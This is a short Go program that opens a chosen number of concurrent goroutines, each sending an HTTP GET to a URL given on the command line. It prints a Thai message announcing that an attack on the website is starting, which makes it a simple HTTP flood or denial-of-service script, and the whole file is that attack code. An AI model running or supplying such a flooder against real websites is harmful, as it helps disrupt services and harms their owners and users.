package main

import (
    "fmt"
    "net/http"
    "os"
    "strconv"
    "sync"
)

func main() {
    
    targetUrl := os.Args[1]
    threads, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("Usage : go run test.go <URL> <THREADS>")
        return
    }

    var wg sync.WaitGroup

           
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go func(i int) {
            fmt.Println("เริ่มโจมตีไปที่เว็ปไซต์ จำนวน", i)

                            
            resp, err := http.Get(targetUrl)
            if err != nil {
                fmt.Println(err)
                wg.Done()
                return
            }
            defer resp.Body.Close()

            wg.Done()
        }(i)
    }
	
    wg.Wait()
}